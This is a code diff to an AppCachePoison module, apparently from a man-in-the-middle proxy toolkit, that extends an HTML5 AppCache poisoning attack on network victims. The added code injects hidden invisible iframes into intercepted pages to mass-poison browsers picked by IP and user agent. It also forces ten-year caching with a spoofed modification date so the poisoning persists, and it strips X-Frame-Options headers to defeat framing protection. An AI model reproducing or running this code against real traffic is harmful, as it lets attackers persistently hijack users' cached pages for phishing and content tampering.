@@ -29,19 +29,30 @@ class AppCachePoison(DummyResponseTamperer):
     AppCachePosion performs HTML5 AppCache poisioning attack - see http://blog.kotowicz.net/2010/12/squid-imposter-phishing-websites.html
     '''
     
-    def tamper(self, url, data, headers, req_headers):
+    mass_poisoned_browsers = []
+
+    def tamper(self, url, data, headers, req_headers, ip):
         if not self.isEnabled():
           return data
-          
+        
+        if "enable_only_in_useragents" in self.config:
+            regexp = self.config["enable_only_in_useragents"]
+            if regexp and not re.search(regexp,req_headers["user-agent"]):
+                logging.log(logging.DEBUG, "Tampering disabled in this useragent (%s)" % (req_headers["user-agent"]))
+                return data
+               
         url = self.urlMonitor.getRedirectionSource(url)
         
         (s,element) = self.getSectionForUrl(url)
         if not s:
+          data = self.tryMassPoison(url, data, headers, req_headers, ip)
           return data
+        
 
-        logging.log(logging.WARNING, "Found url %s in section %s" % (url, s['__name__']))
+        logging.log(logging.WARNING, "Found URL %s in section %s" % (url, s['__name__']))
         p = self.getTemplatePrefix(s)
         if element == 'tamper':
+          logging.log(logging.WARNING, "Poisoning tamper URL")
           if os.path.exists(p + '.replace'): # replace whole content
             f = open(p + '.replace','r')
             data = self.decorate(f.read(), s)
@@ -58,18 +69,54 @@ class AppCachePoison(DummyResponseTamperer):
           data = re.sub(re.compile("<html",re.IGNORECASE),"<html manifest=\"" + self.getManifestUrl(s)+"\"", data)
           
         elif element == "manifest":
+          logging.log(logging.WARNING, "Poisoning manifest URL")
           data = self.getSpoofedManifest(url, s)
           headers.setRawHeaders("Content-Type", ["text/cache-manifest"])
 
         self.cacheForFuture(headers)
+        self.removeDangerousHeaders(headers)
         return data
 
+    def tryMassPoison(self, url, data, headers, req_headers, ip):
+        browser_id = ip
+        if "user-agent" in req_headers:
+            browser_id += req_headers["user-agent"]
+            
+        if not 'mass_poison_url_match' in self.config: # no url
+            return data
+        if browser_id in self.mass_poisoned_browsers: #already poisoned
+            return data
+        if 'mass_poison_useragent_match' in self.config and not "user-agent" in req_headers:
+            return data
+        if not re.search(self.config['mass_poison_useragent_match'], req_headers['user-agent']): #different UA
+            return data
+        if not re.search(self.config['mass_poison_url_match'], url): #different url
+            return data
+        
+        logging.log(logging.WARNING, "Adding AppCache mass poison for URL %s, ip %s" % (url, ip))
+        appendix = self.getMassPoisonHtml()
+        data = re.sub(re.compile("</body>",re.IGNORECASE),appendix + "</body>", data)
+        self.mass_poisoned_browsers.append(browser_id) # mark to avoid mass spoofing for this ip
+        return data
+
+    def getMassPoisonHtml(self):
+        html = "<div style=position:absolute;left:-100px>"
+        for i in self.config:
+            if isinstance(self.config[i], dict):
+                if self.config[i].has_key('tamper_url'):
+                    html += "<iframe sandbox style=opacity:0;visibility:hidden width=1 height=1 src=\"" + self.config[i]['tamper_url'] + "\"></iframe>" 
+
+        return html + "</div>"
+        
     def cacheForFuture(self, headers):
-      ten_years = 315569260
-      headers.setRawHeaders("Cache-Control",["max-age="+str(ten_years)])
-      headers.setRawHeaders("Last-Modified",["Mon, 29 Jun 1998 02:28:12 GMT"]) # it was modifed long ago, so is most likely fresh
-      in_ten_years = date.fromtimestamp(time.time() + ten_years)
-      headers.setRawHeaders("Expires",[in_ten_years.strftime("%a, %d %b %Y %H:%M:%S GMT")])
+        ten_years = 315569260
+        headers.setRawHeaders("Cache-Control",["max-age="+str(ten_years)])
+        headers.setRawHeaders("Last-Modified",["Mon, 29 Jun 1998 02:28:12 GMT"]) # it was modifed long ago, so is most likely fresh
+        in_ten_years = date.fromtimestamp(time.time() + ten_years)
+        headers.setRawHeaders("Expires",[in_ten_years.strftime("%a, %d %b %Y %H:%M:%S GMT")])
+
+    def removeDangerousHeaders(self, headers):
+        headers.removeHeader("X-Frame-Options")
 
     def getSpoofedManifest(self, url, section):
         p = self.getTemplatePrefix(section)
